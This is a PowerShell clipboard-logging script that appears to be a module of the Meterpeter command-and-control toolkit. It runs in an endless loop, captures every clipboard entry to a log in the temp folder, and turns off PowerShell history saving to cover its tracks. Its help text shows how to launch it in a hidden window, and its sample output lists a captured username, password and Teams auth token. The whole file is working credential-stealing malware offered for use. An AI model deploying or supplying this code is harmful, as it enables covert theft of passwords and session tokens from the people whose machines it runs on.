<#
.SYNOPSIS
   ClipBoard Keylogger

   Author: @r00t-3xp10it (ssa redteam)
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: Get-ClipBoard
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.2

.DESCRIPTION
   Auxiliary module of Meterpeter C2 that captures clipboard entrys
   and store them under '$Env:TMP\ClipBoardLogger.log' for review.

.NOTES
   This Cmdlet will run in loop untill is process pid its manual
   stoped or the system restarts. It stores logfiles but it will
   not delete them in the end of execution, leaving logs on disk.
   Logfile will contain the clipboard_keylogger PID (manual stop)

.Parameter Delay
   The sleep time (seconds) between each capture (default: 1)

.Parameter Storage
   Where to store cliplogger logfile (default: $Env:TMP)

.Parameter DontFilter
   Switch that adds duplicated entrys to logfile

.EXAMPLE
   PS C:\> .\ClipLogger.ps1 -delay "5"
   Sleep for 5 sec before next capture

.EXAMPLE
   PS C:\> .\ClipLogger.ps1 -dontfilter
   Append duplicated entrys to logfile

.EXAMPLE
   PS C:\> .\ClipLogger.ps1 -storage "$Env:TMP\logs"
   Capture clipboard inputs are store them on %tmp%\logs

.EXAMPLE
   PS C:\> Start-Process -WindowStyle hidden powershell -argumentlist "-file ClipLogger.ps1"
   Execute ClipLogger.ps1 cmdlet in a hidden windows terminal (orphan process)

.INPUTS
   None. You cannot pipe objects into ClipLogger.ps1

.OUTPUTS
   * ClipBoard CopyLogger.
   Logfile   : 'C:\Users\pedro\OneDrive\Ambiente de Trabalho\ClipboardLogger.log'
   StartDate : 18/01/2023 [21:56:40]
   PID       : 13504

   ClipBoard : username:peterUrunbu
   ClipBoard : password=r003xp10it
   ClipBoard : .teams.microsoft.comauthtoken%Yf5LjBcDsP0Iti40Bkifr

.LINK
   https://github.com/r00t-3xp10it/meterpeter
   https://github.com/r00t-3xp10it/redpill
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Storage="$Env:TMP",
   [switch]$DontFilter,
   [int]$Delay='1'
)


$CmdletVersion = "v1.0.2"
$ErrorActionPreference = "SilentlyContinue"
$LoggerTime = (Get-Date -Format 'dd/MM/yyyy [HH:mm:ss]')
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "@ClipLogger $CmdletVersion {SSA@RedTeam}"

## Cmdlet mandatory parameters checks
If([bool]((Get-Module -ListAvailable).ExportedCommands|findstr /C:"Get-Clipboard") -iMatch 'False')
{
   write-host "error: powershell missing module 'Get-Clipboard'" -ForegroundColor Red
   return
}

If(-not(Test-Path -Path "$Storage"))
{
   write-host "not found: '$Storage'" -ForegroundColor Red
   return
}


$PPID = $PID
## Print Information OnScreen
$FinalPath = "$Storage" + "\ClipboardLogger" -join ''
write-host "`n* ClipBoard CopyLogger." -ForegroundColor Green
write-host "Logfile   : '" -NoNewline
write-host "${FinalPath}.log" -ForegroundColor Red -NoNewline
write-host "'"
write-host "StartDate : $LoggerTime"
write-host "PID       : " -NoNewline
write-host "$PPID`n" -ForegroundColor Red

## Create logfile on sellected location
echo "* ClipBoard CopyLogger." > "${FinalPath}.log"
echo "LogFile   : '${FinalPath}.log'" >> "${FinalPath}.log"
echo "StartDate : $LoggerTime" >> "${FinalPath}.log"
echo "PID       : $PPID`n" >> "${FinalPath}.log"


#Loop forever
While($true)
{
   $ClipEntrys = (Get-Clipboard -Raw)
   If(-not([string]::IsNullOrEmpty($ClipEntrys)))
   {
      If($DontFilter.IsPresent)
      {
         ## Add duplicated entrys to logfile
         Write-Host "ClipBoard : " -NoNewline
         Write-Host "$ClipEntrys" -ForegroundColor Green
         echo "ClipBoard : $ClipEntrys" >> "${FinalPath}.log"       
      }
      Else
      {
         ## Do NOT add duplicated entrys to logfile.
         $checkme = (Get-Content -Path "${FinalPath}.log")
         If(-not($checkme -iMatch "^(ClipBoard : $ClipEntrys)$"))
         {
            Write-Host "ClipBoard : " -NoNewline
            Write-Host "$ClipEntrys" -ForegroundColor Green
            echo "ClipBoard : $ClipEntrys" >> "${FinalPath}.log"      
         }
      }
   }

   ## Sleep between captures
   Start-Sleep -Seconds $Delay
}